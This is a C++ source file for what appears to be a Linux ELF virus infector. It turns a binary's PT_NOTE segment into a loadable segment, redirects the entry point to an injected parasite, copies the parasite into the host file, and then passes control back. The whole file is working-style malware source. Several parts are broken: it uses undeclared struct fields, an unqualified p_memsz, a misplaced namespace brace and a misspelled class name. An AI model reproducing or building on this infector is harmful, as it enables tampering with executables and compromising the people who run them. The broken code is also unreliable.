#include "infector/pt_note_infect.hh"
#include <linux/elf.h>
#include <linux/limits.h>
#include "common/file_descriptor.hh"
#include "common/patch_pattern.hh"
#include "common/patch_relinguish_control.hh"
#include "std/string.hh"

namespace vt::infector {

namespace {
struct ElfInfo {
  Elf64_Addr original_e_entry;
  Elf64_Addr original_pt_note_file_offset;
  Elf64_Addr parasite_load_address;
  size_t pt_note_to_be_infected_idx = 0;
};

uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & ~(4 - 1)) + 4; }
uint64_t round_up_to(uint64_t v, uint64_t alignment) {
  return (v & ~(alignment - 1)) + alignment;
}

bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
               size_t padded_virus_size, const ElfInfo& info) {
  auto sht_entry_count = ehdr.e_shnum;
  auto section_entry_start = &shdr;

  // Extend the last section in code
  auto last_section_in_code =
      section_entry_start + info.last_section_idx_in_code;
  last_section_in_code->sh_size += padded_virus_size;

  // Shift all section entries back.
  for (auto cur_entry = last_section_in_code + 1;
       cur_entry < section_entry_start + sht_entry_count; ++cur_entry) {
    cur_entry->sh_offset += padded_virus_size;
    if (cur_entry->sh_addr) {
      cur_entry->sh_addr += padded_virus_size;
    }
  }
  return true;
}

void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
                const ElfInfo& info) {
  auto* pt_note_to_be_infected = &phdr + info.pt_note_to_be_infected_idx;
  // trasforming pt_note to pt_load
  pt_note_to_be_infected->p_align = info.pt_load_alignment;
  pt_note_to_be_infected->p_vaddr = info.parasite_load_address;
  pt_note_to_be_infected->p_filesz = virus_size;
  pt_note_to_be_infected->p_memsz = virus_size;
  pt_note_to_be_infected->p_offset = virus_offset;
}

void patch_ehdr(Elf64_Ehdr& ehdr, const ElfInfo& info, uint64_t virus_offset) {
  if (ehdr.e_type == ET_EXEC) {
    ehdr.e_entry = info.parasite_load_address;
  } else if (ehdr.e_type == ET_DYN) {
    ehdr.e_entry = virus_offset;
  } else {
    CHECK_FAIL();
  }
}

bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
              const Elf64_Shdr& shdr, ElfInfo& info) {
  info.original_e_entry = ehdr.e_entry;

  // Find code segment
  const Elf64_Phdr* phdr_entry = &phdr;
  for (size_t i = 0; i < ehdr.e_phnum; ++i, ++phdr_entry) {
    if (phdr_entry->p_type == PT_LOAD) {
      // the parasite should have a loading address avoiding all other LOAD
      // segments.
      auto last_byte_of_segment = phdr_entry->p_vaddr + p_memsz - 1;
      auto potential_virus_loading_addr = last_byte_of_segment + 1;
      info.parasite_load_address = vt::max(
          info.parasite_load_address,
          round_up_to(potential_virus_loading_addr, phdr_entry->p_align));
      // copy alignment so later we can assign to PT_NOTE.
      info.pt_load_alignment = phdr_entry->p_align;
    } else if (phdr_entry->p_type == PT_NOTE) {
      // We found the last PT_NOTE section that can be infected, because
      // GNU_PROPERTY (for example on x86-64) might overlap with the first. On
      // aarch64, it doesn't have such problem.
      info.pt_note_to_be_infected_idx = i;
      info.original_pt_note_file_offset = phdr_entry->p_offset;
    }
    // Do not early break out because we must scan all LOAD segments to find the
    // highest vaddress.
  }

  return true;
}  // namespace

}  // namespace

bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                      vt::common::Mmap<PROT_READ> parasite_mapping) {
  const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN ||
      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
    return false;
  }

  ElfInfo info{};
  const auto& phdr =
      *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);
  const auto& shdr =
      *reinterpret_cast<const Elf64_Shdr*>(host_mapping.base() + ehdr.e_shoff);
  if (!get_info(ehdr, phdr, shdr, info)) {
    printf("Cannot correctly parse host elf phdr\n");
    return false;
  }

  const auto virus_size = parasite_mapping.size();
  // because host size is extended with original_size + virus_size + 3
  // calculate the virus insertion offset. for example:
  // original_size = 25, virus_size = 4, total_host_size = 31.
  // virus offset (must be word aligned) is align_up(31 - 4) = 28;
  const auto virus_offset = round_up_to(host_mapping.size() - virus_size, 4);
  {
    auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
        host_mapping.mutable_base() + ehdr.e_phoff);
    patch_phdr(mutable_phdr, virus_size, virus_offset, info);
  }

  /*{
    auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
        host_mapping.mutable_base() + ehdr.e_shoff);
    if (!patch_sht(ehdr, mutable_shdr, padded_virus_size, info)) {
      printf("Failed to patch section header table\n");
      return false;
    }
  }*/

  {
    auto& mutable_ehdr =
        *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
    patch_ehdr(mutable_ehdr, info, virus_offset);
  }

  printf("inject parasite at %x loading at %x\n", virus_offset,
         info.parasite_load_address);
  printf("entry changed to %x\n", ehdr.e_entry);

  // Inject the virus.
  memcpy(host_mapping.mutable_base() + info.parasite_file_offset,
         parasite_mapping.base(), parasite_mapping.size());

  return patch_parasite_and_relinquish_control(
      ehdr.e_type, info.original_e_entry, info.parasite_load_address,
      virus_offset, parasite_mapping.size(), host_mapping);
}

size_t PtNodeInfect::output_size(size_t host_size, size_t parasite_size) {
  // file is extended with virus. On some arch the virus needs to start at word
  // aligned address. Therefore always return 3 extra bytes.
  return host_size + parasite_size + 3;
}

}  // namespace vt::infector